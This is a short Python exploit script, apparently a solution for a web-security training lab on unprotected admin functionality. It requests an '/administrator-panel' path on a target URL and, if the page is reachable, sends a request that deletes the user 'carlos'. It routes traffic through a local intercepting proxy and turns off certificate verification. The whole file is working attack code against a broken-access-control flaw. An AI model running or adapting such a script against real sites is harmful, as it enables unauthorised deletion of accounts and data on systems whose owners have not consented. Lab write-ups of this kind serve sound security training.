import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_admin_panel(s, url):
    admin_url = url + "/administrator-panel"
    r = requests.get(admin_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("[+] Found the administrator panel!")
        print("Deleting the Carlos user...")
        delete_carlos_url = admin_url + "/delete?username=carlos"
        r = requests.get(delete_carlos_url, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("[+] Carlos user deleted!")
        else:
            print("[-] Could not delete carlos.")
            sys.exit(-1)
    else:
        print("[-] Unable to find the admin panel.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    print("[+] Finding admin panel...")
    find_admin_panel(s, url)

if __name__ == "__main__":
    main() 